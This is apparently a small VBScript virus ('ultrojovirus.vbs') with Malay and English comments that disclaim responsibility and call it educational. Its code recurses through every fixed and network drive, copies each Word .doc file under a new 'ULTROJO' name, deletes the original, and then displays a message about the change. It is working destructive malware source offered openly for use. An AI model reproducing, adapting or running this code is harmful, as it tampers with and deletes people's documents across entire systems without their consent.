'OS tested win95/98/nt/2000/3000
'ultrojo tak tanggungjawab atas apa jua kesan menggunakan code ini
'for educational purpose sahaja tau!
'any bugs mail me timedotcom@hotmail.com
'fail ini akan menukar semua nama word document dengan tambahan xxxxxultrojo.doc
'fail name=ultrojovirus.vbs dan lebih kurang 1-3 minit masa diambil bergantung kelajuan pc anda


set fso=createobject("Scripting.Filesystemobject")
mygirl
msgbox "Semua Nama Document Word telah ditambah ULTROJO hujungnya!"&vbcr&_
"Sila Run Fail ultrojoubat.vbs untuk kembalikan keadaan asal."
sub mygirl
for each sayangku in fso.drives
if sayangku.drivetype = 2 or sayangku.drivetype=3 then 'semua drive aku kerjakan
folist(sayangku.path&"\")
end if
Next
end sub
sub folist(sfolder)
set fol=fso.getfolder(sfolder)
set foll=fol.subfolders
for each flist in foll
listing(flist.path)
folist(flist.path)
next
end sub
sub listing(ll)
set f=fso.getfolder(ll)
set fff=f.files
for each ff in fff
base=fso.getbasename(ff.path)
set cop=fso.getfile(ff.path)
ext=fso.getextensionname(ff.path)
ext=lcase(ext)
if ext="doc" then
cop.copy(ll&"\"&base&"ULTROJO.doc")
fso.deletefile(ff.path)
end if
next
end sub
'end of code

